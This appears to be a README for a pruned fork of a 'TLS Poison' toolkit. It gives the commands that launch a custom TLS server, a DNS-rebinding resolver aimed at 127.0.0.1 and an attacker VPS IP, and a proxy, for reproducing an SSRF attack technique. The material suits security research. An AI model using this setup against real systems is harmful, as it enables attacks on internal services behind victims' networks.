# TLS Poison
Modified from https://github.com/jmdx/TLS-poison. Have pruned the original repo. Use two vps to reproduce the attack tech.



###	TLS Tool

`cargo build`


```
cd TLS-poison/client-hello-poisoning/custom-tls
target/debug/custom-tls -p 11211 --verbose --certs /root/tls/fullchain.pem --key /root/tls/privkey.pem http
```


```
target/debug/custom-tls -p 11210 --verbose --tickets --certs /path/to/fullchain.pem --key /path/to/privkey.pem --protover 1.2 http
```

###  DNS Tool
```
cd /root/TLS-poison/client-hello-poisoning/custom-dns
python3 alternate-dns.py dns.smuggling.xyz,127.0.0.1 -b 0.0.0.0 -t 139.159.160.211 -d 8.8.8.8
```

###  Proxy Tool
```
python2 proxy.py
```

###	New DNS Tool

```
python3 alternate-dns.py example.com --ip x.x.x.x --mode static_zero
Usage:
     --ip 					 Your vps ip or an ip which you want the domain point to.
     --static_zero   In this mode, the tool will return two A records in a DNS query. One of the records is your vps ip, the other one is 0.0.0.0.
     --rebinding		 In this mode, the tool will only return an A records in a DNS query. But it will randomly return 127.0.0.1 or the ip you set. Similar like the original alternate-dns tool.
```

